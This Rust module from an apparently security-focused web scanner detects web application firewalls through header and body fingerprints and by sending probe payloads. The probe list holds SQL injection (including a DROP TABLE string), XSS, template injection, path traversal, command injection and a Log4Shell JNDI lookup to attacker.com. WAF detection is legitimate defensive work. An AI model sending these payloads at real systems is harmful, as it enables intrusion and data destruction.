//! WAF (Web Application Firewall) detection via probing.

use regex::Regex;
use url::Url;
use grym_core::{Confidence, Finding, AssetRef, Severity, Evidence,
                ScopedClient, ScopedClientError, TechniqueTier};

/// WAF-specific probe payloads that trigger WAF blocking patterns.
const WAF_PROBE_PAYLOADS: &[(&str, &str)] = &[
    ("'", "SQLi - single quote"),
    ("\"", "SQLi - double quote"),
    ("<script>alert(1)</script>", "Reflected XSS"),
    ("{{7*7}}", "SSTI - Jinja2/Twig"),
    ("${7*7}", "SSTI - Freemarker/Velocity"),
    ("../../etc/passwd", "Path Traversal"),
    (";id", "Command Injection"),
    ("|id", "Command Injection"),
    ("$(id)", "Command Injection"),
    ("%27%20OR%201%3D1", "URL-encoded SQLi"),
    ("%3Cscript%3Ealert(1)%3C/script%3E", "URL-encoded XSS"),
    ("1' AND SLEEP(5)--", "Time-based SQLi"),
    ("<img/src=x onerror=alert(1)>", "Tag-escaped XSS"),
    ("'><script>alert(1)</script>", "Breakout XSS"),
    ("'; DROP TABLE users--", "SQLi - destructive"),
    ("%2527", "Double-encodedquote"),
    ("%c0%af", "UTF-8 encoded slash"),
    ("..%2f..%2f..%2fetc/passwd", "URL-encoded path traversal"),
    ("\x00<script>", "Null byte XSS"),
    ("${jndi:ldap://attacker.com/a}", "Log4Shell/JNDI"),
    ("<php>eval($_POST cmd);</php>", "PHP injection"),
];

/// WAF vendor detection patterns from response headers/body.
const WAF_SIGNATURES: &[(&str, &str)] = &[
    (r"(?i)x-powered-by.*cloudflare", "Cloudflare"),
    (r"(?i)cf-ray", "Cloudflare"),
    (r"(?i)cf-cache-status", "Cloudflare"),
    (r"(?i)server.*cloudflare", "Cloudflare"),
    (r"(?i)x-firefox-spdy", "Cloudflare"),
    (r"(?i)x-akamai", "Akamai"),
    (r"(?i)x-cache-hint.*Akamai", "Akamai"),
    (r"(?i)server.*akamai", "Akamai"),
    (r"(?i)x-edge", "Akamai"),
    (r"(?i)x-akamai-transformed", "Akamai"),
    (r"(?i)x-sucuri-id", "Sucuri"),
    (r"(?i)x-sucuri-cache", "Sucuri"),
    (r"(?i)x-waf-detected", "Generic WAF"),
    (r"(?i)x-waf", "Generic WAF"),
    (r"(?i)x-proxy-id", "Generic Proxy/WAF"),
    (r"(?i)x-firewall", "Generic Firewall/WAF"),
    (r"(?i)server.*aws-elb", "AWS ALB/ELB"),
    (r"(?i)server.*awselb", "AWS ALB/ELB"),
    (r"(?i)server.*nginx", "Nginx"),
    (r"(?i)server.*apache", "Apache"),
    (r"(?i)server.*iis", "Microsoft IIS"),
    (r"(?i)server.*tomcat", "Apache Tomcat"),
    (r"(?i)x-powered-by.*php", "PHP"),
    (r"(?i)x-powered-by.*asp", "ASP.NET"),
    (r"(?i)x-powered-by.*express", "Express/Node.js"),
    (r"(?i)x-powered-by.*django", "Django"),
    (r"(?i)x-powered-by.*rails", "Rails"),
    (r"(?i)x-powered-by.*laravel", "Laravel"),
    (r"(?i)set-cookie.*__cfduid", "Cloudflare"),
    (r"(?i)set-cookie.*cf_clearance", "Cloudflare"),
    (r"(?i)set-cookie.*akamai", "Akamai"),
    (r"(?i)set-cookie.*sucuri_ids", "Sucuri"),
    (r"(?i)strict-transport-security", "HSTS enabled (security-focused)"),
    (r"(?i)x-content-type-options", "Security header present"),
    (r"(?i)x-frame-options", "Clickjacking protection"),
    (r"(?i)content-security-policy", "CSP header (WAF integration possible)"),
    (r"(?i)x-xss-protection", "XSS Filter enabled"),
    (r"(?i)x-amz-cf-id", "AWS CloudFront"),
    (r"(?i)x-fastly-request-id", "Fastly CDN/WAF"),
    (r"(?i)x-varnish", "Varnish/WAF"),
    (r"(?i)x-sucuri-block", "Sucuri Block"),
    (r"(?i)access-denied|blocked|forbidden", "WAF blocking page"),
    (r"(?i)challenge|verify you are human|captcha", "Bot/challenge protection"),
    (r"(?i)waf|web application firewall|security filter", "WAF detected in response"),
];

/// Response status codes that indicate WAF blocking.
const WAF_BLOCK_STATUSES: &[u16] = &[403, 406, 429, 503];

/// Response body patterns that indicate WAF block pages.
const WAF_BLOCK_BODY_PATTERNS: &[&str] = &[
    r"(?i)access denied",
    r"(?i)blocked by web application firewall",
    r"(?i)this website is using a security service",
    r"(?i)cloudflare",
    r"(?i)incident id",
    r"(?i)request blocked",
    r"(?i)challenge failed",
    r"(?i)captcha",
    r"(?i)please wait",
    r"(?i)you have been flagged",
    r"(?i)waf",
    r"(?i)security incident",
    r"(?i)ray-id",
    r"(?i)access control",
    r"(?i)request forbidden",
    r"(?i)your ip has been rate limited",
];


pub async fn detect_waf(
    client: &ScopedClient,
    url: &Url,
) -> Result<Vec<Finding>, ScopedClientError> {
    let mut findings = Vec::new();

    // Phase 1: Passive WAF fingerprinting from normal response headers
    let base_response = client
        .get("grym-web-scanner", url.clone(), TechniqueTier::SafeActive)
        .await;

    if let Ok(ref base_resp) = base_response {
        for (pattern, waf_name) in WAF_SIGNATURES {
            // Check headers
            for (header_name, header_value) in &base_resp.headers {
                let combined = format!("{}: {}", header_name, header_value);
                if let Ok(re) = Regex::new(pattern)
                    && re.is_match(&combined) {
                        let mut f = Finding::new(
                            format!("WAF detected via response header: {}", waf_name),
                            AssetRef {
                                identifier: url.to_string(),
                                kind: "web".into(),
                            },
                            Severity::Info,
                            Confidence::Confirmed,
                            "grym-web-scanner",
                        );
            f.categories.push("active-recon".into());
            f.categories.push("waf-detection".into());
            f.evidence.push(Evidence::redacted(
                "waf-header",
                            format!("Header matched: {:?} with pattern {:?}", header_name, pattern),
                            &combined,
                        ));
                        f.references.push("https://www.acunetix.com/websitesecurity/web-application-firewall/".into());
                        findings.push(f);
                    }
            }

            // Check body
            if let Ok(re) = Regex::new(pattern)
                && re.is_match(&base_resp.body) {
                    let mut f = Finding::new(
                        format!("WAF detected via response body: {}", waf_name),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        Severity::Info,
                        Confidence::Confirmed,
                        "grym-web-scanner",
                    );
                    f.categories.push("Active Reconnaissance".into());
                    f.categories.push("WAF Detection".into());
                    f.evidence.push(Evidence::redacted(
                        "waf-body",
                        format!("Body matched pattern: {}", pattern),
                        base_resp.body.chars().take(200).collect::<String>(),
                    ));
                    findings.push(f);
                }
        }
    }

    // Phase 2: Active probing with WAF-triggering payloads
    for (payload, attack_type) in WAF_PROBE_PAYLOADS {
        let mut test_url = url.clone();
        let first_param: Option<(String, String)> = url.query_pairs().next()
            .map(|(k, v)| (k.into_owned(), v.into_owned()));
        {
            let mut pairs = test_url.query_pairs_mut();
            pairs.clear();
            if let Some((k, _)) = first_param {
                pairs.append_pair(&k, payload);
            } else {
                pairs.append_pair("q", payload);
            }
        }

        if let Ok(response) = client
            .get("grym-web-scanner", test_url, TechniqueTier::StandardDetection)
            .await
        {
            // Check if WAF blocked the request
            if WAF_BLOCK_STATUSES.contains(&response.status) {
                let mut f = Finding::new(
                    format!("WAF blocking detected for {} payload (HTTP {})", attack_type, response.status),
                    AssetRef {
                        identifier: url.to_string(),
                        kind: "web".into(),
                    },
                    Severity::Medium,
                    Confidence::Confirmed,
                    "grym-web-scanner",
                );
                f.categories.push("WAF Detection".into());
                f.categories.push("Active Reconnaissance".into());
                f.evidence.push(Evidence::redacted(
                    "waf-probe",
                    format!("Payload triggered WAF block: {} (HTTP {})", attack_type, response.status),
                    response.body.chars().take(200).collect::<String>(),
                ));
                findings.push(f);
            }

            // Check body for WAF block page patterns
            for pattern in WAF_BLOCK_BODY_PATTERNS {
                if let Ok(re) = Regex::new(pattern)
                    && re.is_match(&response.body) {
                        let mut f = Finding::new(
                            format!("WAF blocking page detected for {} payload", attack_type),
                            AssetRef {
                                identifier: url.to_string(),
                                kind: "web".into(),
                            },
                            Severity::Medium,
                            Confidence::Confirmed,
                            "grym-web-scanner",
                        );
                        f.categories.push("WAF Detection".into());
                        f.categories.push("Active Reconnaissance".into());
                        f.evidence.push(Evidence::redacted(
                            "waf-block-page",
                            format!("WAF block page triggered by: {}", attack_type),
                            response.body.chars().take(200).collect::<String>(),
                        ));
                        findings.push(f);
                        break;
                    }
            }
        }
    }

    // Phase 3: Fingerprint WAF type based on blocking behavior
    if findings.iter().any(|f| f.title.contains("blocking"))
        && let Ok(ref base_resp) = base_response {
            // Check for specific WAF signatures in the block page
            if let Ok(re) = Regex::new(r"(?i)cloudflare|cf-ray|challenge-stage")
                && re.is_match(&base_resp.body) {
                    findings.push(Finding::new(
                        "Cloudflare WAF identified via blocking behavior".to_string(),
                        AssetRef {
                            identifier: url.to_string(),
                            kind: "web".into(),
                        },
                        Severity::Info,
                        Confidence::Confirmed,
                        "grym-web-scanner",
                    ));
                }
        }

    Ok(findings)
}
